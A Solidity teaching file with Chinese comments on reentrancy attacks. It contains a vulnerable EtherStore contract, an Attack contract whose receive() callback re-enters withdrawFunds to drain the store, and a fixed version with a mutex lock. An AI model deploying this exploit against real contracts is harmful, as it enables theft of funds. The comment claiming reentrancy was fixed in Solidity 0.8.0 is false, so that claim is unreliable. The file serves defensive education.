// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.8.0;

/*
@重入攻击
- 介绍
    - 首先，合约之间能相互调用；其次，合约在将以太币发送给外部地址时需要提交外部调用，那么这些外部调用有可能会被攻击者劫持从而触发回退函数执行多余代码。
    - 重入，指的是外部的恶意合约通过函数调用重新进入漏洞合约的代码执行过程。
    - 从0.8.0版本开始被修复。

- （下面受攻击合约）的几种修改方案
    -   1. 使用内置函数transfer() 像外部合约转账，因为带有2300gas的限制，不足以目标地址再次调用其他合约
    -   2. 确保所有对状态变量的修改都在向外部合约转账前执行，即检查-生效-交互模式
    -   3. 引入互斥锁，包含在下面代码中
*/

// 1. 给出存在漏洞的合约示例
contract EtherStore {
    uint256 public withdrawLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    constructor() payable {}

    // 存入以太币
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    // 提出以太币
    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw, "balance insufficient");
        require(_weiToWithdraw <= withdrawLimit, "amount over limit");
        // require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "last withdraw time less than 1 weeks");

        // 问题代码：将会触发caller合约的回退函数，若caller合约在回退逻辑中再次调用此合约的withdrawFunds()，则将陷入多次重入
        // 又因为余额扣减代码在下方得不到执行，将造成此合约地址中的以太币被全部转账到caller合约。
        (bool success,) = msg.sender.call{value : _weiToWithdraw}("");
        require(success, "receiver rejected ETH transfer");

        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }
}

// 2. 攻击上面的合约
contract Attack {
    EtherStore public etherStore;

    event revertTrigger(uint);

    // 用合约地址初始化变量 etherStore;
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 攻击函数
    function attackEtherStore() public payable {
        require(msg.value >= 1 ether, "eth is not enough");
        // 将1 eth存入合约
        etherStore.depositFunds{value : 1 ether}();
        // 提出以太币
        etherStore.withdrawFunds(1 ether);
    }

//    fallback() external payable {
//        emit revertTrigger(1);
//    }

    // 收款回调
    receive() external payable {
        emit revertTrigger(2);
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}


// 3. 改进存在漏洞的合约（测试时注释掉 此合约 或 上面有漏洞的合约）
contract EtherStore {
    uint256 public withdrawLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    // 改进3：引入互斥锁
    bool reEntryLock = false;

    constructor() payable {}
    // 存入以太币
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    // 提出以太币
    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(!reEntryLock, "reEntryLock is required");
        require(balances[msg.sender] >= _weiToWithdraw, "balance insufficient");
        require(_weiToWithdraw <= withdrawLimit, "amount over limit");
//        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "last withdraw time less than 1 weeks");

        balances[msg.sender] -= _weiToWithdraw; // 改进2

        reEntryLock = true; // 外部调用前加锁
        msg.sender.transfer(_weiToWithdraw); // 改进1
        reEntryLock = false; // 调用后释放锁

        lastWithdrawTime[msg.sender] = block.timestamp;
    }
}